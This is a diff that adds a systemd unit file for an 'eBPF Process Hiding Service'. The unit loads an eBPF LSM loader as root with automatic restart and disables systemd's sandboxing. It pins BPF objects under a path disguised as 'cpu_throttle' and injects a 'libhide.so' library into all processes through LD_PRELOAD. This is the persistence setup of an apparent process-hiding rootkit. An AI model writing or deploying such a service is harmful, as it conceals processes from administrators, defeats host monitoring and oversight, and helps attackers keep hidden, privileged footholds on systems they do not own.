@@ -1,0 +1,41 @@
+[Unit]
+Description=eBPF Process Hiding Service
+Documentation=file:///opt/lsm_hide/docs/RUNTIME_DEPLOYMENT_GUIDE.md
+After=network.target
+Wants=network.target
+
+[Service]
+Type=simple
+User=root
+Group=root
+ExecStart=/opt/lsm_hide/bin/lsm_hide_loader
+ExecStartPost=/bin/sleep 2
+ExecStartPost=/bin/bash -c 'echo "eBPF LSM loaded successfully" | systemd-cat -t lsm-hide'
+ExecStartPost=/bin/bash -c 'ls -la /sys/fs/bpf/cpu_throttle/ | systemd-cat -t lsm-hide'
+ExecReload=/bin/kill -HUP $MAINPID
+ExecStop=/bin/bash -c 'echo "Cleaning up eBPF resources..." | systemd-cat -t lsm-hide'
+ExecStopPost=/bin/bash -c 'rm -f /sys/fs/bpf/cpu_throttle/* 2>/dev/null || true'
+Restart=always
+RestartSec=5
+StandardOutput=journal
+StandardError=journal
+SyslogIdentifier=lsm-hide
+
+# Security settings
+NoNewPrivileges=false
+ProtectSystem=false
+ProtectHome=false
+PrivateTmp=true
+PrivateDevices=false
+
+# Resource limits
+LimitNOFILE=65536
+LimitNPROC=4096
+
+# Working directory
+WorkingDirectory=/opt/lsm_hide
+Environment=LD_LIBRARY_PATH=/opt/lsm_hide/bin
+Environment=LD_PRELOAD=/opt/lsm_hide/bin/libhide.so
+
+[Install]
+WantedBy=multi-user.target
